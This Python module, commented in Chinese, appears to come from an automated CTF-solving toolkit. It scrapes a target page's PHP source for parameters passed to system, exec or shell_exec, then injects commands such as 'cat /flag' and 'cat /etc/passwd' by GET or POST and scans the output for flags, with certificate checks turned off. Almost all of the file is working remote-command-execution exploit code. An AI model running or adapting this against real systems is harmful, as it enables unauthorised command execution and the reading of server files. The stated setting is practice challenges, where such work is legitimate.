# -*- coding: utf-8 -*-
"""简单命令注入直接探测引擎 (SimpleCmdRCE)

场景: system($_POST['x']) / shell_exec($_GET['x']) 等无 WAF 的
直接命令执行靶场。用普通命令直接探测, 不走 bashFuck 编码
(WAF 专用), 命中 flag 立即返回。

流程:
1. 从页面源码提取真实命令执行函数 + 参数 (严格过滤, 只留
   $_POST/$_GET/$_REQUEST 直接/间接传入 system/exec 等函数的)
2. 对每个参数: GET/POST 发送普通命令 (cat /flag 等)
3. 响应中检测 flag
"""

from __future__ import annotations
import re
import urllib.request
import urllib.parse
import ssl

FLAG_RE = re.compile(
    r'(flag\{[^{};:#\n]{4,}\}|ISCC\{[^{};:#\n]{4,}\}|ctf\{[^{};:#\n]{4,}\}|CTF\{[^{};:#\n]{4,}\}|'
    r'Gee?sec\{[^{};:#\n]{4,}\}|BUUCTF\{[^{};:#\n]{4,}\}|NSSCTF\{[^{};:#\n]{4,}\}|'
    r'[A-Za-z0-9_]{8,32}\{[^{};:#\n]{8,64}\})'
)

# 命令注入入口函数
_ENTRY_RE = [
    # system($_POST['x']) / system($_GET['x']) / system($_REQUEST['x'])
    re.compile(r"(?:system|exec|shell_exec|passthru|popen|proc_open)\s*\(\s*"
               r"\$_(?:GET|POST|REQUEST)\s*\[\s*['\"]([^'\"]+)['\"]\s*\]", re.I),
    # $v = $_POST['x']; system($v);
    re.compile(r"\$(\w+)\s*=\s*\$_(?:GET|POST|REQUEST)\s*\[\s*['\"]([^'\"]+)['\"]\s*\]\s*;", re.I),
    # f($_POST['x']); ... function f($p){ system($p); }
    re.compile(r"(\w+)\s*\(\s*\$_(?:GET|POST|REQUEST)\s*\[\s*['\"]([^'\"]+)['\"]\s*\]\s*\)", re.I),
]

# 探测命令 (按优先级)
_PROBE_CMDS = [
    ('cat /flag', 'cat /flag'),
    ('cat /flag*', 'cat /flag*'),
    ('tac /flag', 'tac /flag'),
    ('nl /flag', 'nl /flag'),
    ('cat /*flag*', 'cat /*flag*'),
    ('cat /etc/passwd', 'cat /etc/passwd'),
    ('ls /', 'ls /'),
]

_CTX = None

def _make_ctx():
    global _CTX
    if _CTX is None:
        _CTX = ssl.create_default_context()
        _CTX.check_hostname = False
        _CTX.verify_mode = ssl.CERT_NONE
    return _CTX


def _http_fetch(url, data=None, timeout=8):
    """GET (data=None) 或 POST (data=bytes) 请求, 返回响应文本。"""
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) YangWeb/4.0',
            'Content-Type': 'application/x-www-form-urlencoded',
        }
        req = urllib.request.Request(url, data=data, headers=headers,
                                     method='POST' if data else 'GET')
        with urllib.request.urlopen(req, timeout=timeout, context=_make_ctx()) as resp:
            raw = resp.read()
        charset = 'utf-8'
        ctype = resp.headers.get('Content-Type', '')
        m = re.search(r'charset=([\w-]+)', ctype, re.I)
        if m:
            charset = m.group(1)
        return raw.decode(charset, errors='replace')
    except Exception:
        return ''


def _extract_flag(text):
    # 跳过 CSS/样式误报: flag{...} 内容含 ; : 或 常见 CSS 属性则不是真 flag
    for m in FLAG_RE.finditer(text):
        f = m.group(0)
        inner = f[f.index('{') + 1: f.rindex('}')]
        if any(c in inner for c in (';', ':', '#', '{')):
            continue
        if len(inner) < 4:
            continue
        return f
    return None


def _extract_cmd_params(source):
    """从源码提取命令执行参数。返回 [{param, method}]。

    严格模式: 只匹配直接/间接传给命令执行函数的参数。
    """
    import html as _html
    # 源码可能是 HTML 实体编码 (highlight_file 输出 &lt;?php) → 先解码
    if '&lt;' in source or '&gt;' in source or '&amp;' in source:
        source = _html.unescape(source)
    # 去掉 \' \" 转义 (HTML 里展示的 PHP 源码常见)
    source = source.replace(r"\'", "'").replace(r'\"', '"')
    # highlight_file 输出每个 token 被 <span style> 包裹 → 剥离标签
    # 但保留 <br> 作为换行, 避免单词被拼坏; 且不能剥掉 <?php ... ?> 代码块
    source = re.sub(r'<br\s*/?>', '\n', source, flags=re.I)
    # 先保护 PHP 代码块: <?php ... ?> 替换为占位符
    _php_blocks = []
    def _hold(m):
        _php_blocks.append(m.group(0))
        return f'\x00PHPBLOCK{len(_php_blocks)-1}\x00'
    source = re.sub(r'<\?php.*?\?>', _hold, source, flags=re.I | re.S)
    source = re.sub(r'<[^>]+>', '', source)
    def _restore(m):
        return _php_blocks[int(m.group(1))]
    source = re.sub(r'\x00PHPBLOCK(\d+)\x00', _restore, source)
    params = []
    seen = set()

    # Pattern 1: 直接传入
    for rx in _ENTRY_RE[:1]:
        for m in rx.finditer(source):
            p = m.group(1)
            if (p, 'POST') not in seen and (p, 'GET') not in seen:
                params.append({'param': p, 'method': 'POST'})
                seen.add((p, 'POST'))

    # Pattern 2: 赋值后传入 ($v = $_POST['x']; system($v);)
    assigns = {}
    for m in _ENTRY_RE[1].finditer(source):
        var, param = m.group(1), m.group(2)
        assigns[var] = param
    if assigns:
        # system($v) 出现在源码中
        for m in re.finditer(r'(?:system|exec|shell_exec|passthru|popen|proc_open)\s*\(\s*\$(\w+)\s*\)', source, re.I):
            var = m.group(1)
            if var in assigns:
                p = assigns[var]
                if (p, 'POST') not in seen:
                    params.append({'param': p, 'method': 'POST'})
                    seen.add((p, 'POST'))

    # Pattern 3: 函数链 f($_POST['x']); function f($p){system($p);}
    for m in _ENTRY_RE[2].finditer(source):
        p = m.group(2)
        if (p, 'POST') not in seen:
            params.append({'param': p, 'method': 'POST'})
            seen.add((p, 'POST'))

    # 兜底: 源码有命令执行函数但没匹配到参数 → 常见参数名
    if not params and re.search(r'(?:system|exec|shell_exec|passthru|popen|proc_open)\s*\(', source, re.I):
        # 从 $_POST/$_GET 出现的地方提取
        for m in re.finditer(r"\$(?:GET|POST|REQUEST)\s*\[\s*['\"]([^'\"]+)['\"]\s*\]", source):
            p = m.group(1)
            if (p, 'POST') not in seen:
                params.append({'param': p, 'method': 'POST'})
                seen.add((p, 'POST'))
        # 数字参数名 (PHP 自动转换 . → _ 的题)
        if not params:
            for i in range(10):
                params.append({'param': str(i), 'method': 'POST'})
                seen.add((str(i), 'POST'))

    return params


def simple_cmd_rce(url, on_progress=None):
    """探测简单命令注入。返回 {flag, param, method} 或 None。"""
    def _log(stage, item, status):
        if on_progress:
            try:
                on_progress(stage, item, status)
            except Exception:
                pass

    _log('cmdRCE', 'fetch', '获取页面源码...')
    source = _http_fetch(url, timeout=10)
    if not source:
        return None

    # 静态 flag
    f = _extract_flag(source)
    if f:
        return {'flag': f, 'param': None, 'method': None, 'status': 'static_flag'}

    params = _extract_cmd_params(source)
    _log('cmdRCE', 'detect', f'{len(params)} 个命令注入参数')
    if not params:
        return None

    for p in params:
        param, method = p['param'], p['method']
        _log('cmdRCE', 'try', f'param={param} method={method}')

        for label, cmd in _PROBE_CMDS:
            if method == 'POST':
                data = urllib.parse.urlencode({param: cmd}).encode()
                text = _http_fetch(url, data=data, timeout=8)
            else:
                sep = '&' if '?' in url else '?'
                text = _http_fetch(f"{url}{sep}{param}={urllib.parse.quote(cmd)}", timeout=8)

            if not text:
                continue

            flag = _extract_flag(text)
            if flag:
                _log('cmdRCE', 'flag!', f'{label}: {flag}')
                return {'flag': flag, 'param': param, 'method': method,
                        'cmd': label, 'status': 'solved'}

            # 输出非空 + 无错误 → 命令执行成功
            before = text.split('<?php')[0] if '<?php' in text else text
            clean = re.sub(r'<[^>]+>', '', before).strip()
            if clean and 'Cannot execute a blank' not in clean and \
               'syntax error' not in clean.lower() and 'not found' not in clean.lower():
                _log('cmdRCE', 'output', f'[{label}] {clean[:120]}')

    _log('cmdRCE', 'done', '所有参数探测完毕')
    return None
